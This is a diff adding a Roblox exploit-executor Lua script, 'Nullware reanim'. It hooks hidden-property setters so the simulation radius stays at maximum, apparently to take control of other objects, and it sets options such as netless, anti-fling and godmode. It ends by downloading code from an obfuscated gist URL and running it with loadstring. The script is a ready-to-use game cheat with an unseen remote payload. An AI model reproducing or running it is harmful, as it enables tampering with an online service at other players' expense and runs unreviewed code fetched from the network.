@@ -1,0 +1,56 @@
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = "Nullware reanim";
+	Text = "Made by Firox#9999 aka skid";
+	Icon = "rbxthumb://type=Asset&id=6973876392&w=150&h=150"})
+Duration = 16;
+
+wait(1.0)
+
+local maxSim = 1000
+getgenv().setsimulationradius = newcclosure(function(i,v)
+    local plr = game.Players.LocalPlayer
+    sethiddenproperty(plr,"MaxSimulationRadius",maxSim)
+    sethiddenproperty(plr,"SimulationRadius",maxSim)
+end)
+
+local sethidden
+sethidden = hookfunction(getgenv().sethiddenproperty,function(i,p,v)
+    local plr = game.Players.LocalPlayer
+    if i == plr then
+        if (p == "MaxSimulationRadius" or p == "SimulationRadius") then
+            if v == maxSim then
+                sethidden(i,p,v)
+            end
+        else
+            sethidden(i,p,v)
+        end
+    else
+        sethidden(i,p,v)
+    end
+end)
+
+wait(1.0)
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local Heartbeat = game:GetService("RunService").Heartbeat
+
+Heartbeat:Connect(function()
+    LocalPlayer.MaximumSimulationRadius = math.huge
+    sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
+end)
+
+wait(1.0)
+
+getgenv().Nullware_ReanimateConfiguration = {
+	["Netless"] = true, --Toggles Netless.
+	["Anti-Fling"] = true, --Toggles Anti-Fling.
+	["Hats To Align"] = {}, --List of hats that you want to align. (e.g. {"Hat1", "Hat2"} or {"All"})
+	["Head Movement Without Godmode"] = false, --Toggles Head Movement Without Godmode.
+	["Enable Limb Collisions"] = false, --Enables your limb's collisions. (Overrides "Disable Torso Collisions" if enabled, also doesn't require godmode)
+	["Disable Torso Collisions"] = false, --Disables your torso's collisions. (Doesn't work with godmode)
+	["R15 To R6"] = false, --Toggles R15 To R6.
+	["Godmode"] = false --Toggles Godmode.
+}
+loadstring(game:HttpGetAsync("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/8cd532018277ee9982433eea25a6c14f/raw/sewMjTpJvVBLR96L"))()
+
+wait(1.0)
